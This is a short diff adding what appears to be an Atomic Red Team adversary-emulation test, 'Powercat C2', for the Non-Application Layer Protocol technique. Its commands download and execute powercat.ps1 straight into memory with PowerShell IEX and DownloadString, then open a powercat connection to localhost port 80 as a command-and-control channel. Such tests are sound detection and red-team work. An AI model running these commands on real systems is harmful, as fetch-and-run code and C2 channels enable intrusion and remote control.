@@ -1,0 +1,8 @@
+#TechniqueName: Non-Application Layer Protocol
+#AtomicTestName: Powercat C2
+#Language: ps1
+
+#commands
+IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
+powercat -c 127.0.0.1 -p 80
+
